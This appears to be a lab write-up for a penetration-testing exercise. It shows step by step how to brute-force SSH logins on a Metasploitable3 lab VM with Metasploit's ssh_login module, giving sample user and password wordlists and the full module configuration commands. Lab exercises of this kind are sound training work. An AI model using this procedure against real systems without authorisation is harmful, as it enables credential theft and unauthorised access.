# Phase 1: Setup and Compromise the SSH Service

Task 1.1: Use Kali Linux tool Metasploit to compromise the SSH service Using Metasploit

## Objective
Use the `auxiliary/scanner/ssh/ssh_login` module in Metasploit to brute-force SSH credentials on the Metasploitable3 target machine.

---

## 🖥️ Step 1: Setup the Target Environment

- **Attacker Machine:** Kali Linux (on UTM)
- **Victim Machine:** Metasploitable3 Ubuntu 14.04 (on UTM)
- **Target IP Address:** `192.168.100.10`
- **Target SSH Port:** `22` (default)

---

## Step 2: Create Wordlist Files

### users.txt

```text
admin
root
user
vagrant
aisha
test
```
### pass.txt
```text
password
123456
toor
vagrant
aishapass
testpass
```

## Step 3: Load the SSH Login Module

### Launch Metasploit:
```text
sudo msfconsole
```
### Load the SSH login module:
```text
use auxiliary/scanner/ssh/ssh_login
```

## Step 4: Configure the Module

### Set the Target Host, Username & Password Files, and Improve Brute-Force Performance:
```text
set RHOSTS 192.168.100.10
set USER_FILE /home/kali/ssh-brute/users.txt
set PASS_FILE /home/kali/ssh-brute/pass.txt
set BRUTEFORCE_SPEED 5
set THREADS 4
set VERBOSE true
```

## Step 5: Run the Attack
```text
run
```

## Results:
![SSH Brute-force Result](screanshots/ssh-results.jpg)










